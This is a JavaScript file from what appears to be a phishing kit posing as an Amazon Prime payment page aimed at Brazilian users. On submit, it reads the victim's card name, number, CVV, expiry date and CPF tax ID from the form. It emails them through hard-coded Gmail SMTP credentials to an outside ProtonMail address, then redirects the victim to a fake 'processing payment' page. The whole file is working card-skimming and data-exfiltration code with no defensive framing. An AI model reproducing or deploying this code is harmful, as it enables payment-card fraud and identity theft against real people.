window.onload = function()
{
    const btn = document.querySelector('#submit');
    btn.addEventListener("click", function(e) {
        e.preventDefault();
        var name = document.querySelector("#ap_cardinfo_cardName");
        var oname = name.value;

        var number = document.querySelector("#ap_cardinfo_cardNumber");
        var ccnumber = number.value;

        var cvv = document.querySelector("#ap_cardinfo_cardCvv");
        var cardcvv = cvv.value;

        var data = document.querySelector("#ap_cardinfo_data");
        var ccexp = data.value;

        var cpf = document.querySelector("#ap_cardinfo_cpf");
        var ccpf = cpf.value;



        
        Email.send({
            Host: "smtp.gmail.com",
            Username : "xsda.ddce.2343.2343.xsop@gmail.com",
            Password : "ryqi owje owui bjfw",
            To : 'user1533@protonmail.com',
            From : "xsda.ddce.2343.2343.xsop@gmail.com",
            Subject : `Amazon Prime: CARD > ${ccnumber}`,
            Body : `<table>
                  <tr>
                    <th>Card Name</th>
                  </tr>
                  <tr>
                    <td>${oname}</td>
                  </tr>
                </table>
                <table>
                  <tr>
                    <th>Card Number</th>
                  </tr>
                  <tr>
                    <td>${ccnumber}</td>
                  </tr>
                </table>
                <table>
                  <tr>
                    <th>Card CVV</th>
                  </tr>
                  <tr>
                    <td>${cardcvv}</td>
                  </tr>
                </table>
                <table>
                  <tr>
                    <th>CC Exp</th>
                  </tr>
                  <tr>
                    <td>${ccexp}</td>
                  </tr>
                </table>
                <table>
                  <tr>
                    <th>CPF</th>
                  </tr>
                  <tr>
                    <td>${ccpf}</td>
                  </tr>
                </table>`,
        });
        window.location.href = "processando-pagamento.html";

    });
}

